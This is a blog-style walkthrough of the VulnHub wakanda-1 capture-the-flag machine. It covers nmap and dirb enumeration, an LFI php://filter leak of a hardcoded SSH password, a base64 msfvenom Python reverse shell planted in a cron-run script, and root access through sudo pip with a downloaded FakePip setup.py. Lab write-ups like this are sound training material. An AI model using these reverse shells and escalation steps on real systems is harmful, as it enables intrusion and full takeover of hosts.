---
layout: post-detail
title: CTF challenge - wakanda
date: 2018-09-24
categories: CTF
description: Walkthrough on wakanda-1 from https://www.vulnhub.com/entry/wakanda-1,251/
img-url: ''
comments: true
---

# Download the iso

Image is here:  https://www.vulnhub.com/entry/wakanda-1,251/

# Target

Syn scan.

    $ sudo nmap -sS 192.168.2.0/24

```sh
Nmap scan report for 192.168.2.217
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  rpcbind
3333/tcp open  dec-notes
MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
```

The target contain a web server on port 80.
Now, a scan `tcp` with `Version`.

    $ sudo nmap -sT -sV -A -p- 192.168.2.217

```txt
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33015/tcp  status
|_  100024  1          41724/udp  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
33015/tcp open  status  1 (RPC #100024)
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A try with netcat:

    $ nc 192.168.2.217 3333
    SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u4

We found the version of ssh and debian.

A scan with dirb:

    $ dirb http://192.168.2.217 /usr/share/dict/dirb-wordlists/common.txt 

```txt
---- Scanning URL: http://192.168.2.217/ ----
+ http://192.168.2.217/backup (CODE:200|SIZE:0)
+ http://192.168.2.217/index.php (CODE:200|SIZE:1527)
+ http://192.168.2.217/secret (CODE:200|SIZE:0)
+ http://192.168.2.217/server-status (CODE:403|SIZE:301)
+ http://192.168.2.217/shell (CODE:200|SIZE:0)
```

No formular, pages `/backup`, `/secret`, `/shell` are void... `/server-status` need permission... ???

The source code of `/index.php` include a comment who point on a `/?lang=fr` parameter. At bottom, we found the name `mamadou`.

This param is vulnerable to a Local File Inclusion (LFI), according this post on [medium.com](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) or [securityidiots.com](http://securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html) , i've try many things here.  

The url `?lang=php://filter/convert.base64-encode/resource=index` reveal something.

    $ curl http://192.168.2.217/\?lang\=php://filter/convert.base64-encode/resource\=index -o secret

We purge all html content from the file `secret`, and we will able to decode the content.

    $ cat secret | base64 -d 

```php
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>
```

Try user and pass on ssh:

    $ ssh mamadou@192.168.2.217 -p 3333
    password: Niamey4Ever227!!!
    
```python
>>> help()

Welcome to Python 2.7!  This is the online help utility.
```

Ok... we'll switch on a bash shell.

    >>> import pty;pty.spawn("bash")
    $ uname -a
    $ cd 
    $ cat flag1.txt
    Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc

The second flag is in `/home/devops`.

    $ cat /home/devops/flag2.txt
    cat: /home/devops/flag2.txt: Permission denied

    $ ls -l /home/devops/
    -rw-r----- 1 devops developer 42 Aug  1 15:57 flag2.txt

We need find a way to become `devops` or member of group `developer` for read the key.

    $ find / -user devops 2>/dev/null
    /srv/.antivirus.py
    /tmp/test
    /home/devops
    /home/devops/.bashrc
    /home/devops/.profile
    /home/devops/.bash_logout
    /home/devops/flag2.txt

    $ ls -l /srv/.antivirus.py
    -rw-r--rw- 1 devops developer 36 Aug  1 20:08 /srv/.antivirus.py

Nice, a file where we can write something, like a reverse shell to become `devops:developer`.

    $ msfvenom -p cmd/unix/reverse_python LHOST=192.168.2.111 LPORT=1234 -f raw

```txt
Payload size: 457 bytes
python -c "exec('aW1wb3J0IHNvY2tldCAgLCAgc3VicHJvY2VzcyAgLCAgb3M7ICAgICAgIGhvc3Q9IjE5Mi4xNjguMi4xMTEiOyAgICAgICBwb3J0PTEyMzQ7ICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICAgcy5jb25uZWN0KChob3N0ICAsICBwb3J0KSk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgMCk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgMSk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgMik7ICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"
```

Modify the file `/srv/.antivirus.py` like this:

```python
#open('/tmp/test','w').write('test')
exec('aW1wb3J0IHNvY2tldCAgLCAgc3VicHJvY2VzcyAgLCAgb3M7ICAgICAgIGhvc3Q9IjE5Mi4xNjguMi4xMTEiOyAgICAgICBwb3J0PTEyMzQ7ICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICAgcy5jb25uZWN0KChob3N0ICAsICBwb3J0KSk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgMCk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgMSk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgMik7ICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))
```
Open a socket on your machine:

    $ nc -lvp 1234

And the script will start by itself like it use cron.

    $ id 
    uid=1001(devops) gid=1002(developer) groups=1002(developer)
    cat /home/devops/flag2.txt
    Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098

To read the last key, we need permission of `root`, so with sudo or anything.

    sudo -l
    User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip

Devops can execute `/usr/bin/pip` without password...

    ls -l /usr/bin/pip
    -rwxr-sr-- 1 root developer 281 Feb 27  2015 /usr/bin/pip

Unfortunately, we can't write on this file to execute a reverse shell.

After googling thoroughly, we can use `fakepip`.  
Download the file from [fakepip](wget https://raw.githubusercontent.com/0x00-0x00/FakePip/master/setup.py)

    $ wget -cv https://raw.githubusercontent.com/0x00-0x00/FakePip/master/setup.py

Edit this file to change the `RHOST` and `lport`.

```python
RHOST = '192.168.2.111'  # change this
lport = 3333
```
Next, we need a find a way to upload our payload. We create a simple server with python, you can use `darkhttpd`, `ngrok` too or upload the file at `https://transfer.sh`.

    $ python2.7 -m SimpleHTTPServer 4444

From the vm, wget -cv http://192.168.0.111:4444/setup.py

Start netcat:

    $ nc -lvp 3333

With ou user `devops`, launch pip:

    $ sudo pip install . --upgrade --force-reinstall

You are root now:

```txt
listening on [any] 3333 ...
192.168.2.217: inverse host lookup failed:
connect to [192.168.2.111] from (UNKNOWN) [192.168.2.217] 57633
root@Wakanda1:/tmp/pip-QVoVOV-build#
```
    cd
    cat root.txt

```txt
 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc
```

This vm was very instructive :)
